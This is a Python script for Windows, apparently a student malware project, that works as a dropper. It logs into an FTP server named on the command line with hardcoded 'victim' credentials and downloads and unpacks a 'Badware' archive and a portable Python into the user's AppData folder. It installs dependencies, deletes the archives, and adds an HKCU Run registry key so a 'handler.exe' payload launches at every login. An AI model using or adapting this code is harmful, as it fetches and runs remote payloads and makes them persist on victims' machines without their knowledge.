import subprocess
import sys
import ftplib
import os
from zipfile import ZipFile
username = os.getlogin()
session = ftplib.FTP(sys.argv[1],'victim','victimpass1234')
os.mkdir(r"C:\\users\\{}\\AppData\\Local\\Aryan".format(username))
session.retrbinary("RETR Badware.zip", open(r"C:\\users\\{}\\AppData\\Local\\Aryan\\Badware.zip".format(username), 'wb').write)
with ZipFile(r"C:\\users\\{}\\AppData\\Local\\Aryan\\Badware.zip".format(username), 'r') as zObject:
	zObject.extractall(
		path=r"C:\\users\\{}\\AppData\\Local\\Aryan\\Badware".format(username))
session.retrbinary("RETR py.zip", open(r"C:\\users\\{}\\AppData\\Local\\Aryan\\Badware\\py.zip".format(username), 'wb').write)
session.quit()
with ZipFile(r"C:\\users\\{}\\AppData\\Local\\Aryan\\Badware\\py.zip".format(username), 'r') as zObject:
	zObject.extractall(
		path=r"C:\\users\\{}\\AppData\\Local\\Aryan\\Badware\\py".format(username))
with open(r"C:\\users\\{}\\AppData\\Local\\Aryan\\Badware\\ftpserver".format(username), "x") as f:
    f.write(sys.argv[1])
subprocess.run(['C:/users/{}/AppData/Local/Aryan/Badware/py/WPy64-31090/python-3.10.9.amd64/python.exe'.format(username), '-m', "pip", "install", "-r", "../../../requirements.txt"])
os.remove(r"C:\\users\\{}\\AppData\\Local\\Aryan\\Badware\\py.zip".format(username))
os.remove(r"C:\\users\\{}\\AppData\\Local\\Aryan\\Badware.zip".format(username))
try:
    import _winreg as winreg
except ImportError:
    # this has been renamed in python 3
    import winreg
def set_run_key(key, value):
    """
    Set/Remove Run Key in windows registry.

    :param key: Run Key Name
    :param value: Program to Run
    :return: None
    """
    # This is for the system run variable
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)

    with reg_key:
        if value is None:
            winreg.DeleteValue(reg_key, key)
        else:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ
            else:
                var_type = winreg.REG_SZ
            winreg.SetValueEx(reg_key, key, 0, var_type, value)
set_run_key('Python-final-proj',fr"C:\users\{username}\AppData\Local\Aryan\Badware\handler.exe")